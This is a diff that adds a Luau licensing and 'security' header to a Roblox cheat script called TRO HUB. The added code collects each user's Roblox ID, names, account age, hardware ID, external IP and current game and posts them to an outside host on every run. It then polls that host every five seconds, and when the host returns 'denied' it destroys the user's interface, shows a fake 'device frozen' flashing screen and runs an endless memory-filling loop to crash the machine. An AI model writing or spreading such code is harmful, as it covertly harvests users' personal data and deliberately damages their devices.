@@ -1,3 +1,242 @@
+-- ==========================================
+-- 🛡️ TRO HUB • Ultimate Production Luau Core (Hell Advanced Security)
+-- ==========================================
+
+local API_URL = "https://43xc5imj1q.apps.bot-hosting.cloud/check?id="
+local STORE_URL = "https://43xc5imj1q.apps.bot-hosting.cloud/store_pending"
+
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local MarketplaceService = game:GetService("MarketplaceService")
+local RunService = game:GetService("RunService")
+local CoreGui = game:GetService("CoreGui")
+local Workspace = game:GetService("Workspace")
+local LocalPlayer = Players.LocalPlayer
+
+if getgenv().TRO_HUB_LOADED then
+    warn("TRO HUB: السكربت شغال مسبقاً!")
+    return
+end
+getgenv().TRO_HUB_LOADED = true
+
+local function safeRequest(options)
+    local success, res = pcall(function()
+        local req = request or http_request or (syn and syn.request) or (fluxus and fluxus.request) or (delta and delta.request)
+        if req then return req(options) end
+    end)
+    if success and res then return res end
+    return nil
+end
+
+local mapName = "Unknown Map"
+pcall(function()
+    local info = MarketplaceService:GetProductInfo(game.PlaceId)
+    if info and info.Name then mapName = tostring(info.Name) end
+end)
+local placeIdStr = tostring(game.PlaceId)
+
+local avatarImg = "https://www.roblox.com"
+pcall(function()
+    local thumbUrl = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. tostring(LocalPlayer.UserId) .. "&size=420x420&format=Png&isCircular=false"
+    local r = safeRequest({Url = thumbUrl, Method = "GET"})
+    if r and r.Body then
+        local data = HttpService:JSONDecode(r.Body)
+        if data and data.data and data.data[1] and data.data[1].imageUrl then
+            avatarImg = tostring(data.data[1].imageUrl)
+        end
+    end
+end)
+
+local extIp = "Unknown_IP"
+pcall(function()
+    local ipRes = safeRequest({Url = "https://api.ipify.org?format=json", Method = "GET"})
+    if ipRes and ipRes.Body then
+        local ipData = HttpService:JSONDecode(ipRes.Body)
+        if ipData and ipData.ip then extIp = tostring(ipData.ip) end
+    end
+end)
+
+local currentHwid = (getgenv and getgenv().gethwid and getgenv().gethwid()) or 
+                  (RbxAnalyticsService and RbxAnalyticsService:GetClientId()) or 
+                  (syn and syn.get_hwid and syn.get_hwid()) or 
+                  ("HWID_" .. tostring(LocalPlayer.UserId))
+
+local userNick = tostring(LocalPlayer.Name) .. " (" .. tostring(LocalPlayer.DisplayName) .. ")"
+
+local function getPayloadForServer(isAllowed)
+    return {
+        user_id = tostring(LocalPlayer.UserId),
+        username = tostring(LocalPlayer.Name),
+        display_name = tostring(LocalPlayer.DisplayName),
+        account_age = tostring(LocalPlayer.AccountAge),
+        game_name = mapName,
+        place_id = placeIdStr,
+        hwid = currentHwid,
+        external_ip = extIp,
+        avatar = avatarImg,
+        status = isAllowed and "allowed" or "denied"
+    }
+end
+
+local function sendServerLog(isAllowed)
+    task.spawn(function()
+        pcall(function()
+            safeRequest({
+                Url = STORE_URL,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HttpService:JSONEncode(getPayloadForServer(isAllowed))
+            })
+        end)
+    end)
+end
+
+-- 🛑 دالة التدمير
+local isDestroyed = false
+local function triggerDestruction(reason)
+    if isDestroyed then return end
+    isDestroyed = true
+    
+    print("TRO Security: تم حظرك! إطلاق بروتوكول التدمير...")
+    sendServerLog(false)
+    
+    pcall(function()
+        for _, gui in ipairs(CoreGui:GetChildren()) do
+            if gui.Name ~= "RobloxGui" then pcall(function() gui:Destroy() end) end
+        end
+        for _, gui in ipairs(LocalPlayer.PlayerGui:GetChildren()) do
+            pcall(function() gui:Destroy() end)
+        end
+    end)
+
+    pcall(function()
+        for i = 1, 70 do
+            task.spawn(function()
+                local part = Instance.new("Part")
+                part.Size = Vector3.new(60, 60, 8)
+                part.Position = LocalPlayer.Character and LocalPlayer.Character.Head.Position + Vector3.new(math.random(-60, 60), math.random(0, 50), math.random(-60, 60)) or Vector3.new(0, 10, 0)
+                part.Anchored = true
+                part.CanCollide = false
+                part.Material = Enum.Material.Neon
+                part.Color = Color3.fromHSV(math.random(), 1, 1)
+                part.Parent = Workspace
+                
+                local gui = Instance.new("SurfaceGui")
+                gui.Face = Enum.NormalId.Front
+                gui.Parent = part
+                
+                local txt = Instance.new("TextLabel")
+                txt.Size = UDim2.new(1, 0, 1, 0)
+                txt.BackgroundTransparency = 1
+                txt.Text = "🚨 TRO HUB: PERMANENTLY BANNED! 🚨\n" .. userNick .. "\nMAP: " .. mapName
+                txt.TextColor3 = Color3.fromRGB(255, 255, 255)
+                txt.TextScaled = true
+                txt.Font = Enum.Font.FredokaOne
+                txt.Parent = gui
+            end)
+        end
+    end)
+
+    task.spawn(function()
+        while true do
+            print("🚨 TRO HUB: PERMANENTLY BANNED! 🚨")
+            task.wait(0.01)
+        end
+    end)
+
+    pcall(function()
+        local screenGui = Instance.new("ScreenGui")
+        screenGui.Name = "TRO_Double_Annihilation"
+        screenGui.IgnoreGuiInset = true
+        screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
+        
+        if syn and syn.protect_gui then
+            syn.protect_gui(screenGui)
+            screenGui.Parent = CoreGui
+        else
+            pcall(function() screenGui.Parent = CoreGui end)
+            if not screenGui.Parent then screenGui.Parent = LocalPlayer.PlayerGui end
+        end
+
+        local bg = Instance.new("Frame")
+        bg.Size = UDim2.new(1, 0, 1, 0)
+        bg.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+        bg.BorderSizePixel = 0
+        bg.Parent = screenGui
+
+        task.spawn(function()
+            local cList = {Color3.fromRGB(255,0,0), Color3.fromRGB(0,255,0), Color3.fromRGB(0,0,255), Color3.fromRGB(255,255,255), Color3.fromRGB(0,0,0)}
+            while true do
+                for _, col in ipairs(cList) do
+                    bg.BackgroundColor3 = col
+                    task.wait(0.01)
+                end
+            end
+        end)
+
+        local textLabel = Instance.new("TextLabel")
+        textLabel.Size = UDim2.new(1, 0, 1, 0)
+        textLabel.BackgroundTransparency = 1
+        textLabel.Text = "FATAL ERROR: DEVICE FROZEN!"
+        textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+        textLabel.TextScaled = true
+        textLabel.Font = Enum.Font.FredokaOne
+        textLabel.TextWrapped = true
+        textLabel.Parent = screenGui
+    end)
+
+    task.spawn(function()
+        local doubleMemoryEater = {}
+        while true do
+            for i = 1, 3000000 do
+                table.insert(doubleMemoryEater, string.rep("TRO_DOUBLE_CRASH_KILL_BYPASS", 1000))
+            end
+            RunService.RenderStepped:Wait()
+        end
+    end)
+end
+
+-- ⚡ الفحص
+local function checkStatus()
+    local targetUrl = API_URL .. tostring(LocalPlayer.UserId) .. "&hwid=" .. tostring(currentHwid) .. "&t=" .. math.random(1000, 9999)
+    local res = safeRequest({Url = targetUrl, Method = "GET"})
+    
+    if res and res.Body then
+        local successDecode, data = pcall(function()
+            return HttpService:JSONDecode(res.Body)
+        end)
+        if successDecode and data then
+            return data.status, data.reason
+        end
+    end
+    return "error", "connection_failed"
+end
+
+local initialStatus, initialReason = checkStatus()
+if initialStatus == "denied" then
+    triggerDestruction(initialReason)
+    return
+end
+
+print("TRO Security: تم التحقق بنجاح! أهلاً بك.")
+sendServerLog(true)
+
+-- ==========================================
+-- 🟢 سكربتك الأساسي يوضع هنا:
+-- ==========================================
+print("TRO HUB: تم تشغيل السكربت بنجاح.")
+
+task.spawn(function()
+    while task.wait(5) do
+        local currentStatus, currentReason = checkStatus()
+        if currentStatus == "denied" then
+            triggerDestruction(currentReason)
+            break
+        end
+    end
+end)
+
+
 local RA7L = (function()
 -- ============================================================
 -- RA7L — Complete (Target ui7 + TRO + AntiCuff V2 + Small Spam)
